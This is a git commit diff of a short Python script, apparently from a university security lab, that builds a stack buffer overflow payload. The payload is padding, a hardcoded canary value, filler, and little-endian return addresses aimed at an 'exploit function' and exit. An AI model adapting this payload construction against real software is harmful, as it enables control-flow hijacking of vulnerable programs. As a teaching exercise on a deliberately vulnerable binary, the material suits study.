c8e0cc8f86687a440895bc42d5420d447df853aa
Suraj Rathi <suraj.rathi00@gmail.com>
2023-02-07 12:12:45 +0530

    better exploit string generation

--- a1/lab1_1/get_exp.py
+++ a1/lab1_1/get_exp.py
@@ -6,41 +6,21 @@ exp = ""
 exp += 12 * 'a'
 
 # Replace the canary
-"""hex(1431721816) >>> 0x55565758 >>> UVWX >>> Reverse order because little endian"""
-
+# hex(1431721816) >>> 0x55565758 >>> UVWX >>> Reverse order because little endian
 exp += "XWVU"
 
 # Fill the Function args??? and the old base pointer
 exp += 12 * 'b'
 
-
-"""0x0804887c""" # address of exploit function
+# 0x0804887c: address of exploit function
 # The exploit must be in litle endian, i.e. reverse the bytes 
-exp += chr(0x7c)
-exp += chr(0x88)
-exp += chr(0x04)
-exp += chr(0x08)
+exp += "\x7c\x88\x04\x08"
 
-#"""0x0804e300""" # exit
-#exp += chr(0x00)  # Cannot use 0x00 as part of the address, as that is the end of the string.
-#exp += chr(0xe3)
-#exp += chr(0x04)
-#exp += chr(0x08)
-
-"""0x0804e303""" # exit+3
-exp += chr(0x03) 
-exp += chr(0xe3)
-exp += chr(0x04)
-exp += chr(0x08)
+# 0x0804e300: exit # Cannot use 0x00 as part of the address, as that is the end of the string.
+# 0x0804e303: exit+3
+exp += "\x03\xe3\x04\x08"
 
 print(exp)
-
-#"""0x0804892a"""  # Address of Return Success, didnt work
-#exp += chr(0x2a)
-#exp += chr(0x89)
-#exp += chr(0x04)
-#exp += chr(0x08)
-
 
 
 
